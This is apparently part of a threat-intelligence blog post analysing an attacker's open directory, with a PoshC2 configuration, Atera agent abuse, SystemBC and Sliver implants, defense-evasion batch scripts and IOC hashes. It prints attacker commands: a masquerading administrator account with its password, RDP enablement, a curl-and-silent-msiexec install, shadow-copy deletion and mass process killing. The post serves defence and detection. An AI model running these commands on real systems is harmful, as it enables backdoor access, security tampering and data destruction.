+<p class="wp-block-paragraph">Performing a quick string reveals the configuration of this PoshC2. <a href="https://packetwatch.com/resources/threat-intel/python-poshc2-ioc-analysis" target="_blank" rel="noreferrer noopener">Packetwatch</a> also discussed it on their blog last year.</p>
+
+
+
+<pre class="wp-block-preformatted">domain_front_hdr=94.198.53.143
+server_clean=https://94.198.53.143
+ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+proxy_url=
+proxy_user=
+proxy_pass=
+urls=webhp/
+urls=adsense/troubleshooter/1631343/
+urls=trader-update/history&amp;pd=/
+urls=status/995598521343541248/query=/
+urls=uasclient/0.1.34/modules/
+urls=utag/lbg/main/prod/utag.15.js/
+urls=GoPro5/black/2018/
+urls=usersync/tradedesk/
+urls=bootstrap/3.1.1/bootstrap.min.js/
+urls=TOS/
+urls=business/home.asp&amp;ved=/
+urls=web/20110920084728/
+urls=vssf/wppo/site/bgroup/visitor/
+urls=Philips/v902/
+urls=bh/sync/aol/
+urls=async/newtab/
+urls=advanced_search/
+urls=adServingData/PROD/TMClient/6/8736/
+urls=vfe01s/1/vsopts.js/
+urls=cisben/marketq/
+urls=business/retail-business/insurance.asp/
+urls=client_204/
+urls=branch-locator/search.asp/
+urls=work/embedded/search/
+urls=babel-polyfill/6.3.14/polyfill.min.js=/
+urls=cdba/
+urls=putil/2018/0/11/po.html/
+urls=qqzddddd/2018/load.php/
+urls=types/translation/v1/articles/
+urls=classroom/sharewidget/widget_stable.html/
+jitter=0.2
+sleep_time=5
+kill_date=32501019600
+</pre>
+
+
+
+<h3 id="c18" class="wp-block-heading"><strong>poshc2+user.txt</strong></h3>
+
+
+
+<p class="wp-block-paragraph">While analyzing the files, the ones we observed on the second IP after pivoting with Shodan (185.234.216.64:8000), one additional thing that caught our attention was the poshc2+user.txt file. Let&#8217;s take a look at the content of this text file.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37177" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_046.png" alt="" width="3354" height="1614" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The text file contains multiple commands that we will be dividing into four parts:</p>
+
+
+
+<p class="wp-block-paragraph"><strong>1: PowerShell encoded commands</strong></p>
+
+
+
+<p class="wp-block-paragraph">Below are the PowerShell decoded commands. The download link mentioned on the below decoded commands is not accessible anymore.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37178" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_047.png" alt="" width="1315" height="53" /></a></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>2: Creation of User Account</strong></p>
+
+
+
+<p class="wp-block-paragraph">The below commands are used to create a user account &#8220;WDAGUtil<strong>l</strong>tyAccount&#8221; with a password of &#8220;Ujmqaz5055&#8221;. After creating this account, it will be added to the administrator local group. Notice that this user was trying to masquerade the common system account in Windows &#8220;WDAGUtilityAccount&#8221; with a little typo of &#8220;l&#8221; instead of &#8220;i&#8221;.</p>
+
+
+
+<pre class="wp-block-preformatted">net user WDAGUtilltyAccount Ujmqaz5055 /add
+net localgroup Administrators WDAGUtilltyAccount /add
+</pre>
+
+
+
+<p class="wp-block-paragraph"><strong>3: Enable Remote Desktop Protocol</strong></p>
+
+
+
+<p class="wp-block-paragraph">These commands are divided into two parts. The first one is registry modification, which is used to enable Remote Desktop Protocol (RDP) on a Windows machine by setting the value of &#8220;fDenyTSConnections&#8221; to &#8220;0&#8221;. The second command manipulates and configures the Windows Firewall to allow inbound RDP connections by opening TCP port 3389.</p>
+
+
+
+<pre class="wp-block-preformatted">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
+</pre>
+
+
+
+<p class="wp-block-paragraph"><strong>4: Download and Install Atera Agent</strong></p>
+
+
+
+<p class="wp-block-paragraph">The provided commands utilize &#8216;curl&#8217; to download the Atera Agent installation setup file, specifying the necessary Gmail and account ID. Upon executing the entire command sequence, the &#8216;setup.exe&#8217; file for the Atera Agent was successfully downloaded without encountering any issues.</p>
+
+
+
+<pre class="wp-block-preformatted">curl -o setup.msi "https://HelpdeskSupport613811560.servicedesk.atera.com/GetAgent/Msi/?customerId=1&amp;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="036a6d7766647162776c714f6c646a6d3e6762776a6f7162646d6243646e626a6f2d606c6e">[email&#160;protected]</a>&amp;accountId=&lt;redacted&gt;" &amp;&amp; msiexec /i setup.msi /qn  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7b32150f1e1c091a0f140937141c1215461f1a0f1217091a1c151a3b1c161a121755181416">[email&#160;protected]</a> CompanyId=1 AccountId=&lt;redacted&gt;
+</pre>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37179" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_049.png" alt="" width="2064" height="1274" /></a></figure>
+<p>&nbsp;</p>
+
+
+
+<h3 id="c19" class="wp-block-heading"><strong>py_dropper.sh</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This script is an encoded PoshC2 Python payload dropper.</p>
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37180" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_050.png" alt="" width="1343" height="501" /></a></p>
+
+
+
+<p class="wp-block-paragraph">Decoding the base64 encoded blob results in the following Python script:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37181" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_051.png" alt="" width="1269" height="817" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">This script is a configured version of <a href="https://github.com/nettitude/PoshC2/blob/master/resources/payload-templates/dropper.py" target="_blank" rel="noreferrer noopener">https://github.com/nettitude/PoshC2/blob/master/resources/payload-templates/dropper.py</a> . Decoding it gives us several insights and IOCs (C2 IP, callback URLs, UA) on the threat actor&#8217;s infrastructure and methods. The configuration of settings in this sample, match the same ones observed in the prior samples mentioned, indicating that they were generated during the same server build.</p>
+
+
+
+<h3 id="c20" class="wp-block-heading"><strong>setup_uncnow.mmsi</strong></h3>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37182" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_052.png" alt="" width="1044" height="788" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">This installer deploys the Atera agent, which is part of a remote monitoring and management tool. This tool has commonly misused by various threat actors for intrusions.</p>
+
+
+
+<h3 id="c21" class="wp-block-heading"><strong>shadow.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Contrary to what the script name indicates, this script focus on more than just Volume Shadow Copies.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37183" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_053.png" alt="" width="1426" height="849" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The script uses two commands vssadmin.exe Delete Shadows /All /Quiet and vssadmin delete shadows /all to delete all shadow copies of files and folders on the system.</p>
+
+
+
+<p class="wp-block-paragraph">The script also performs multiple defense evasion techniques by disabling Windows Defender, enabling RDP, and backdooring the system by replacing the accessibility features by cmd.exe as previously seen in cmd.cmd script.</p>
+
+
+
+<h3 id="c22" class="wp-block-heading"><strong>shadowGuru.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This script has two main functions. It first uses the net share command to share several drives with full access permissions to everyone on the network:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37184" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_054.png" alt="" width="1104" height="708" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">Then, it uses a condition to perform several registry cleanups and modifications related to AV programs:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37185" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_055.png" alt="" width="4166" height="566" /></a></figure>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37186" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_056.png" alt="" width="4360" height="654" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The conditional statement is based on the system architecture PROCESSOR_ARCHITECTURE check, and make registry modifications accordingly. Depending on whether the system is 32-bit or 64-bit, registry changes are made using appropriate paths (/reg:32 or /reg:64).</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37187" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_057.png" alt="" width="2042" height="1134" /></a></figure>
+<p>&nbsp;</p>
+
+
+
+<h3 id="c23" class="wp-block-heading"><strong>VmManagedSetup.exe</strong></h3>
+
+
+
+<p class="wp-block-paragraph">The VmManagedSetup.exe<a href="https://tria.ge/240129-1w33ladccq" target="_blank" rel="noreferrer noopener">executable was identified</a> as SystemBC, a malware strain known to perform initial reconnaissance and deliver follow-up malware on select targets. Upon starting, the malware immediately persists itself.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37188" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_058.png" alt="" width="511" height="79" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">This SystemBC sample does so through run-key persistence. Specifically, it creates the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run key of value socks5, intended to execute the sample through PowerShell. While this approach is far from stealthy, SystemBC is known to infect miss-managed corporate devices, often lacking security software.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37189" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_059.png" alt="" width="665" height="539" /></a></figure>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37190" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_060.png" alt="" width="835" height="73" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">After persistence has been established, SystemBC launches its main thread. As shown below, SystemBC starts by launching a separate kill-switch thread, listening locally to avoid concurrent runs. The malware then periodically beacons, alternating between two C2s.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_061.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37191" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_061.png" alt="" width="507" height="375" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">To evade detection, SystemBC ensures its configuration is only decrypted to establish the C2 connection. The malware supports both IPs and host names as C2 addresses.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37192" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_062.png" alt="" width="558" height="645" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The XOR-decoded configuration exposes both SystemBC servers as 94.198.55.181:4337 and 94.198.51.247:4337.</p>
+
+
+
+<pre class="wp-block-preformatted">00000000  42 45 47 49 4e 44 41 54 41 48 4f 53 54 31 3a 39  |BEGINDATAHOST1:9|
+00000010  34 2e 31 39 38 2e 35 35 2e 31 38 31 00 00 00 00  |4.198.55.181....|
+00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+00000030  00 00 00 00 00 00 00 48 4f 53 54 32 3a 39 34 2e  |.......HOST2:94.|
+00000040  31 39 38 2e 35 31 2e 32 34 37 00 00 00 00 00 00  |198.51.247......|
+00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+00000060  00 00 00 00 00 50 4f 52 54 31 3a 34 33 33 37 00  |.....PORT1:4337.|
+00000070  00                                               |.|
+</pre>
+
+
+
+<p class="wp-block-paragraph">As SystemBC&#8217;s main functionality is to deploy additional malware, its download logic provides additional IoCs. As outlined below, the VmManagedSetup.exe executable is capable of fetching additional payloads using a GET request over HTTP/1.0. The employed user agent is:</p>
+<pre>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</pre>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37193" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_063.png" alt="" width="860" height="344" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">Its noteworthy that the download functionality relies on the default hard-coded port INTERNET_DEFAULT_HTTP_PORT, indicative of plain HTTP communications on port 80. These types of communications typically empower organizations to detect suspicious activity through network appliances.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37194" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_064.png" alt="" width="505" height="450" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">Reference:</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://www.virustotal.com/gui/file/cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2/detection" target="_blank" rel="noreferrer noopener">https://www.virustotal.com/gui/file/cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2/detection</a></li>
+</ul>
+
+
+
+<h3 id="c24" class="wp-block-heading"><strong>WILD_PRIDE.exe</strong></h3>
+
+
+
+<p class="wp-block-paragraph">The WILD_PRIDE.exe executable is a <a href="https://github.com/BishopFox/sliver" target="_blank" rel="noreferrer noopener">Sliver</a> implant, an open-source adversary <em>&#8220;emulation&#8221;</em> framework. As the Sliver framework is written in Go and obfuscated using <a href="https://github.com/moloch--/garble" target="_blank" rel="noreferrer noopener">garble</a>, relying on <a href="https://www.joesandbox.com/analysis/1352543/0/html#behavior-graph" target="_blank" rel="noreferrer noopener">dynamic analysis</a> provides the easiest method for C2 identification, which for this sample is the 94[.]198[.]53[.]143 open-directory server.</p>
+
+
+
+<p class="wp-block-paragraph">Sliver relies on <a href="https://en.wikipedia.org/wiki/Protocol_Buffers" target="_blank" rel="noreferrer noopener">Protobuf</a> to serialize command &amp; control communications, which luckily, aren&#8217;t as easily obfuscated. By performing a string analysis against the project&#8217;s Protobuf definitions (identifying <a href="https://github.com/BishopFox/sliver/compare/v1.5.39..v1.5.40#diff-83e4cb648dd1c6a38e0ee4fa4e923ad5a88b3e4ad0fe5d890179f16618cd6675" target="_blank" rel="noreferrer noopener">included</a> and <a href="https://github.com/BishopFox/sliver/compare/v1.5.41..v1.5.42#diff-83e4cb648dd1c6a38e0ee4fa4e923ad5a88b3e4ad0fe5d890179f16618cd6675" target="_blank" rel="noreferrer noopener">excluded</a> changes in protobuf/sliverpb/sliver.proto), we were able to scope down the implant version to likely 1.5.40 or 1.5.41, released mid-2023 to address <a href="https://github.com/advisories/GHSA-8jxm-xp43-qh3q" target="_blank" rel="noreferrer noopener">CVE-2023-34758</a>.</p>
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_065.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37195" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_065.png" alt="" width="452" height="596" /></a></p>
+
+
+
+<p class="wp-block-paragraph">Reference:</p>
+
+
+
+<figure class="wp-block-embed">
+<div class="wp-block-embed__wrapper"><a href="https://www.virustotal.com/gui/file/1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed/detection</a></div>
+</figure>
+
+
+
+<figure class="wp-block-embed is-type-wp-embed is-provider-immersive-labs wp-block-embed-immersive-labs">
+<div class="wp-block-embed__wrapper"><a href="https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/" target="_blank" rel="noopener">https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/</a></div>
+<div> </div>
+</figure>
+
+
+
+<h3 id="c25" class="wp-block-heading"><strong>z.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This script contains 242 lines of code that mainly performs the deletion of services. These are divided into some of the different AV vendors, Hyper-V, and SQL, based on the below categories.</p>
+
+
+
+<pre class="wp-block-preformatted">rem Delite Service "Hyper-V"
+rem Delite Service "AVG"
+rem Delite Service "Malwaresbytes"
+rem Delite Service "Sofos"
+rem Delite Service "Fire_Bird"
+rem Delite Service "SQL"
+rem Delite Service "AV: Webroot"
+rem Delite Service "AV: ESET"
+rem Delite Service "AV: Kaspersky"
+rem Delite Service "AV: Quick Heal"
+rem Delite Service "AV: McAfee"
+rem Delite Service "AV: Trend Micro"
+rem Delite Service "AV: Panda"
+</pre>
+
+
+
+<p class="wp-block-paragraph">Aside from deletion of services, it also performs the killing of multiple processes.</p>
+
+
+
+<pre class="wp-block-preformatted">rem Kill
+rem Kill "AV: Trend Micro"
+rem Kill "SQL"
+</pre>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_066.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37196" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_066.png" alt="" width="2464" height="638" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">These commands are used to check if specific antivirus or endpoint security services are running on a Windows system.</p>
+
+
+
+<ol class="wp-block-list">
+<li>tasklist /fi &#8220;imagename eq MsMpEng.exe&#8221;: This checks if the process for Windows Defender (MsMpEng.exe) is running.</li>
+
+
+
+<li>| find /c &#8220;PID&#8221;: This part filters the previous command&#8217;s output, counting how many lines contain the term &#8220;PID&#8221; (a way to check if the process was found).</li>
+
+
+
+<li>&amp;&amp; Echo Windows Defender: If the previous command found the process (meaning Windows Defender is running), this part will display &#8220;Windows Defender&#8221;.</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">The same structure applies to the other lines, but they check for different processes:</p>
+
+
+
+<ul class="wp-block-list">
+<li>MBCloudEA.exe &amp; MBAMService.exe &#8211; Malwarebytes</li>
+
+
+
+<li>ntrtscan.exe &#8211; Trend Micro Security.</li>
+
+
+
+<li>avp.exe &#8211; Kaspersky Endpoint Security.</li>
+
+
+
+<li>WRSA.exe &#8211; Webroot.</li>
+
+
+
+<li>egui.exe &#8211; ESET.</li>
+
+
+
+<li>AvastUI.exe f &#8211; Avast.</li>
+</ul>
+
+
+
+<pre class="wp-block-preformatted">TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
+</pre>
+
+
+
+<p class="wp-block-paragraph">The last command on this script is used to forcefully stop all processes with a PID of 1000 or higher, except those whose window titles start with &#8220;untitle&#8221;.</p>
+
+
+
+<h3 id="c26" class="wp-block-heading"><strong>z1.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This is by far the most extensive script on this opendir, and it contains over 772 lines of commands. It has exactly the same content of the previous script (z.bat) with additional defense evasion techniques and capabilities.</p>
+
+
+
+<pre class="wp-block-preformatted">rem Delite Service "Hyper-V"
+rem Delite Service "AVG"
+rem Delite Service "Malwaresbytes"
+rem Delite Service "Sofos"
+rem Delite Service "Fire_Bird"
+rem Delite Service "SQL"
+rem Delite Service "AV: Webroot"
+rem Delite Service "AV: ESET"
+rem Delite Service "AV: Kaspersky"
+rem Delite Service "AV: Quick Heal"
+rem Delite Service "AV: McAfee"
+rem Delite Service "AV: Trend Micro"
+rem Delite Service "AV: Panda"
+</pre>
+
+
+
+<p class="wp-block-paragraph">The first part of the script deletes services targeting well-known security AV vendors, as well as services related to Hyper-V and Microsoft SQL.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_067.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37197" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_067.png" alt="" width="1320" height="2300" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">Second part of the script is to stop multiple services related to MS SQL, as well as disable the related services via &#8220;sc config&#8221; command.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_068.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37198" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_068.png" alt="" width="1600" height="2294" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">These commands delete registry entries for various antivirus and security services from the Windows Registry. By targeting the HKLM\SYSTEM\CurrentControlSet\services\ path, they remove configurations for security software such as Kaspersky, Malwarebytes, McAfee, Norton, Avast, AVG, Avira, and many others, effectively disabling these services.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_069.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37199" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_069.png" alt="" width="2894" height="618" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">This part of the script has already been discussed in previous scripts. These are mainly related to Windows settings to enable Remote Desktop, adjust firewall rules, alter the behavior of certain utility programs, and change security policies. Specifically, they allow Remote Desktop connections, create a firewall rule to allow incoming Remote Desktop traffic, and replace the functions of various accessibility tools and Help features with the Command Prompt. Additionally, they disable UAC and Windows Defender and modify Remote Desktop, potentially weakening system security.</p>
+
+
+
+<h2 id="victim" class="wp-block-heading"><a href="#victim">Victim</a></h2>
+
+
+
+<p class="wp-block-paragraph">During the analysis of the open directories identified in this investigation no information was discovered relating to targeting or victims.</p>
+
+
+
+<h2 id="iocs" class="wp-block-heading"><a href="#iocs">Indicators</a></h2>
+
+
+
+<h3 class="wp-block-heading">Atomic</h3>
+
+
+
+<pre class="wp-block-preformatted">PoshC2 IP Address:
+94.198.53.143
+185.234.216.64
+
+Extracted C2 URLs:
+/webhp/
+/adsense/troubleshooter/1631343/
+/trader-update/history&amp;pd=/
+/status/995598521343541248/query=/
+/uasclient/0.1.34/modules/
+/utag/lbg/main/prod/utag.15.js/
+/GoPro5/black/2018/
+/usersync/tradedesk/
+/bootstrap/3.1.1/bootstrap.min.js/
+/TOS/
+/business/home.asp&amp;ved=/
+/web/20110920084728/
+/vssf/wppo/site/bgroup/visitor/
+/Philips/v902/
+/bh/sync/aol/
+/async/newtab/
+/advanced_search/
+/adServingData/PROD/TMClient/6/8736/
+/vfe01s/1/vsopts.js/
+/cisben/marketq/
+/business/retail-business/insurance.asp/
+/client_204/
+/branch-locator/search.asp/
+/work/embedded/search/
+/babel-polyfill/6.3.14/polyfill.min.js=/
+/cdba/
+/putil/2018/0/11/po.html/
+/qqzddddd/2018/load.php/
+/types/translation/v1/articles/
+/classroom/sharewidget/widget_stable.html/<br /><br />SystemBC IP addresses:<br />94.198.55.181:4337<br />94.198.51.247:4337</pre>
+
+
+
+<h3 class="wp-block-heading">Computed</h3>
+
+
+
+<pre class="wp-block-preformatted">atera_del.bat
+754e08c93369e5bfe24ca09b422affdd
+591379f5d7d256e83de05207fd872acfa8e8aa5e
+ea7dec8fa52d2300350367691ae2fbea13dbd5bf80d6b43b05eedf197529aa77
+
+atera_del2.bat
+3c1853831958efe2cc78ea82b4fbd565
+dc14cffa48dd95157fd381cb75bae1773d510c54
+512beb7dfa9fdbc8be7fbf59c7bec7911296f9e36c8a3d3b95e7aef4a88bf09c
+
+backup.bat
+91be6e6a8b4c2cb99db5b99d40e06978
+86f599090aa2c7c1df65dccccf00e1818e72246a
+beb5022543a1e12e1f8f5ffe5d520e5fc9cf623aea512cfb43ea2f8c2897420c
+
+clearlog.bat
+f7a730acc86f1d6759249ccc579b1794
+fe1fb1da6435a6d6283e993569d3fc82a67d7ac8
+09f91e90a1604a633c00d6039581f552603421356cb1edb62e085b32ff01b94e
+
+cmd.cmd
+5336dffb778b1e2a0b982b337652b213
+bd65b5306914187f14bfffa995e7e68a8d036d0c
+4106ce787cf73d7f8215311a241f0e42426301a5a2078da9e3349afade2df684
+
+def1.bat
+1393dab192ea2e2427889839a2d8fcf7
+373609c0f30ee313fd0cc6c4e572452483d87244
+0e626e01d3ae7840aa486468f40138284ccbd70dfe336a6b5d4008d01eb79988
+
+defendermalwar.bat
+1365640fc3c0e1824e348956172caed7
+300c89889bbb5ef61f470174a6fcad73c4516779
+5b43428452a867ad61554d763c8f19ca4cd8af8c31194304785e9e45f9258441
+
+delbackup.bat
+a8b335886e39adf23e6aa44a00bf82dc
+2de53c24663149366fca22f354aff5c0f5b348f4
+6cff22a3ea7c054075b9aded5933587bf997623183539e10e426d103d604f046
+
+disable.bat
+cc35c94e64830ff143b54783c9869ecf
+4a8a4e6069ec4f6a4f24614eb885c57484bc9b79
+fdc105ae79dff83f31777c6e047272c5b372251a3af49e20370e7ee9d1c70763
+
+hyp.bat
+d1e3216cf698a58832d947d95dc4f3f8
+1224f9667d7f1d3b7fba17f414d343912bec03db
+08d40a402b3754e52e4e86003bffddfdccbceefd335f53591f4cf715f8d30321
+
+LOGOFALL.bat
+9a66570b7e25035ff337fa6098f59823
+a65d7caf354161798d2458cfee9e4e988f0e94af
+03b3c37300bf9dcfaa4594e86841b70263324dda305484fb268b27deb09f936c
+
+LOGOFALL1.bat
+c84e1655f0ba917cc605018e32eba9f3
+7dee2a38cc2ba81cc373b50f42c8946601d177cb
+3691dbb1834db4eb8ef4c195d26779b87db267a56f2ebca6c146a53fb8adb9c0
+
+native_dropper
+444d7a27ac0327ccc0cf4e75a32025c9
+8441e7b6b6b9f24439e71c6b031262bc76d73c28
+039bf780ae46875945344af489a590c5b7a36d458372a3173b55b3dc3559dfff
+
+NG1.bat
+aae5ca4d0e7f000ba5f5250caaed0a05
+d08878d7dffe082a908a4bb6387b4739c1a9d3eb
+7e623f907b4a4c924cd8af3bf4b8df45b6f904723cbb26ec87cfe7792388afe1
+
+NG2.bat
+1a4e569f50695f53bd2368cc322a792d
+0a99bd83472444e1bfdd53385fbf2e95bb6dbab9
+d97e2e5e6b23ee0f1efa7326d7ac3240a0df9770bf7c2992eec890f073c9cada
+
+ngrok.exe
+e2eadf60d8f25cae9b29decab461177b
+cecc54143cc375af1b9aed0021643b179574e592
+1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386
+
+ON.bat
+8c7c782df59edd61aabbc510d7747b11
+66ac6cf4bb4247daf1d09d9d4bc4e357cc39c6c8
+b0056bef817408449470d3fa43e13cbc89cabdae795b1dc8cbe9905c5946f530
+
+Posh_v2_dropper_x64.exe
+a5748047ebbe34d7821a2a040e4ca54e
+55126d8215b771aa2f62f16e6aad9e8832824a4c
+63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d
+
+py_dropper.sh
+679d0dab79a98da8e20351f9f887e4f2
+9442647283e52c91c2e836b19749f184936cf6c2
+01ec91a3145332174eef9239f7767adaa5e3dff3a436dfb7d2f978f88ea6cd93
+
+setup_uncnow.msi (Atera Remote Admin)
+c8903eb5763c670a15049d74d764188c
+990f68cca516192d73ef443f51ed80813e324b0b
+91d9c73b804aae60057aa93f4296d39ec32a01fe8201f9b73f979d9f9e4aea8b
+
+shadow.bat
+4cf52cee2001cd10528f429fb6d9fd07
+3cf331934996ec4338418b847b52d78d8a29d224
+87ab1707a553557b10fa721a32f053fbb40d11de6f692e96e067d03316fe530b
+
+shadowGuru.bat
+0f1290d014dfd9e66bbbed96a828f7d1
+b8fc0194f6ed56e4a57c16756e506369c74c4078
+2bcd5702a7565952c44075ac6fb946c7780526640d1264f692c7664c02c68465
+
+VmManagedSetup.exe (SystemBC proxy malware)
+7ee103ee99b95c07cc4a024e4d0fdc03
+885fc76ba1261a1dcce87f183a2385b2b99afd96
+cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2
+
+WILD_PRIDE.exe (Sliver C2)
+6b44d99b258c275ee7fcf230da177f3e
+833a461f6d479d164b453cc9f5f51259d991b1b7
+1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed
+
+z1.bat
+97dc80d3844b01587d9fd6377b9ab0a7
+93b717a562f2cc3fdf2355bd9d2670ba2391cc60
+a668a98e57c03decf6ea76bb32f67f3f077ef2277e57f4117d44f4342977fddf
+
+z.bat
